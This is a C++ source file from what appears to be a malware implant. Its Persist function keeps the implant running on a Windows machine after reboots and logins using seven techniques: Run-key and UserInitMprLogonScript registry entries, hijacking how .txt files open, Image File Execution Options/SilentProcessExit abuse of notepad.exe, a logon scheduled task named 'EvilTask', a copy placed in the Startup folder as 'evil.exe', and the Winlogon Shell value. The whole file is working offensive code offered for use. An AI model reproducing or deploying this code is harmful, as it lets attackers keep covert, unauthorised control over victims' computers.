#include "core/task.hpp"

namespace Task
{
    std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique)
    {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }

        LPCWSTR lpSelfPath = wSelfPath;

        // Persistence process
        if (wcscmp(wTechnique.c_str(), L"runkey") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            std::wstring wValue = Utils::Random::RandomString(8);
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                wValue.c_str(),
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"user-init-mpr-logon-script") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Environment";
        
            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                0,
                KEY_SET_VALUE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"UserInitMprLogonScript",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"default-file-extension-hijacking") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"txtfile\\shell\\open\\command";

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_CLASSES_ROOT,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }

            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKCR\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"ifeo") == 0)
        {
            // Reference: https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
            HKEY hKey;
            DWORD dwGF = 512;
            DWORD dwRM = 1;

            const WCHAR* wImg = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
            const WCHAR* wSilent = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";

            // GlobalFlag
            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wImg,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"GlobalFlag",
                0,
                REG_DWORD,
                (const BYTE*)&dwGF,
                sizeof(dwGF)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set key.";
            }
            pState->pProcs->lpRegCloseKey(hKey);

            if (pState->pProcs->lpRegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                wSilent,
                0,
                nullptr,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE | KEY_QUERY_VALUE,
                nullptr,
                &hKey,
                nullptr
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to create key: SilentProcessExit\\notepad.exe.";
            }
            
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"ReportingMode",
                0,
                REG_DWORD,
                (const BYTE*)&dwRM,
                sizeof(dwRM)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set ReportingMode.";
            }
            if (pState->pProcs->lpRegSetValueExW(
                hKey,
                L"MonitorProcess",
                0,
                REG_SZ,
                (BYTE*)lpSelfPath,
                (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
            ) != ERROR_SUCCESS)
            {
                pState->pProcs->lpRegCloseKey(hKey);
                return L"Error: Failed to set MonitorProcess.";
            }

            pState->pProcs->lpRegCloseKey(hKey);
            return L"Success: The entry has been set to HKLM\\" + std::wstring(wImg) + L" and HKLM\\" + std::wstring(wSilent) + L".";
        }
        else if (wcscmp(wTechnique.c_str(), L"scheduled-task") == 0)
        {
            std::wstring wResult = L"";
            std::wstring wTaskName = L"EvilTask";
            std::wstring wCommand = L"schtasks /create /tn \"" + wTaskName + L"\" /sc ONLOGON /tr \"" + std::wstring(lpSelfPath) + L"\"";

            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            RtlZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            RtlZeroMemory(&pi, sizeof(pi));

            if (!pState->pProcs->lpCreateProcessW(
                nullptr,
                &wCommand[0],
                nullptr,
                nullptr,
                FALSE,
                0,
                nullptr,
                nullptr,
                &si,
                &pi
            )) {
                return L"Error: Failed to create process for schtasks.";
            }

            System::Handle::HandleWait(
                pState->pProcs,
                pi.hProcess,
                FALSE,
                nullptr
            );

            // Get exit code.
            DWORD dwExitCode;
            if (pState->pProcs->lpGetExitCodeProcess(pi.hProcess, &dwExitCode))
            {
                if (dwExitCode == 0)
                {
                    wResult = L"Success: Task \"" + wTaskName + L"\" registered successfully.";
                }
                else if (dwExitCode == 5)
                {
                    wResult = L"Error: Access Denied";
                }
                else
                {
                    wResult = L"Error: Failed to register the task.";
                }
            }
            else
            {
                DWORD dwError = pState->pProcs->lpGetLastError();
                if (dwError == ERROR_ACCESS_DENIED)
                {
                    wResult = L"Error: Access Denied";
                }
                else
                {
                    wResult = L"Error: Failed to register the task.";
                }
            }

            System::Handle::HandleClose(pState->pProcs, pi.hProcess);
            System::Handle::HandleClose(pState->pProcs, pi.hThread);

            return wResult;
        }
        else if (wcscmp(wTechnique.c_str(), L"startup-folder") == 0)
        {
            // Get a destination path (startup folder + implant).
            std::wstring wAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
            std::wstring wFileName = L"evil.exe";
            std::wstring wDest = wAppData + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + wFileName;

            Stdout::DisplayMessageBoxW(wDest.c_str(), L"startup-folder");

            // Read the implant data
            std::vector<BYTE> bytes = System::Fs::FileRead(pState->pProcs, std::wstring(lpSelfPath));

            // Copy to startup folder.
            if (!System::Fs::FileWrite(pState->pProcs, wDest, bytes))
            {
                return L"Error: Failed to copy the implant to a startup folder.";
            }
            
            return L"Success: Implant copied to the startup folder \"" + wDest + L"\" successfully.";
        }
        else if (wcscmp(wTechnique.c_str(), L"winlogon") == 0)
        {
            HKEY hKey;
            std::wstring wSubKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            std::wstring wValue = Utils::Random::RandomString(8);

            LONG result = pState->pProcs->lpRegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                wSubKey.c_str(),
                0,
                KEY_WRITE,
                &hKey
            );
            if (result != ERROR_SUCCESS)
            {
                return L"Error: Failed to open key.";
            }

            std::wstring wExecutables = L"explorer.exe," + std::wstring(wSelfPath);
            LPCWSTR lpExecutables = wExecutables.c_str();
           
            result = pState->pProcs->lpRegSetValueExW(
                hKey,
                L"Shell",
                0,
                REG_SZ,
                (BYTE*)lpExecutables,
                (wcslen(lpExecutables) + 1) * sizeof(WCHAR)
            );
            pState->pProcs->lpRegCloseKey(hKey);

            if (result == ERROR_SUCCESS)
            {
                return L"Success: The entry has been set to HKLM\\" + wSubKey + L".";
            }
            else
            {
                return L"Error: Failed to set value to registry.";
            }
        }
        else
        {
            return L"Not implemented yet.";
        }
    }
}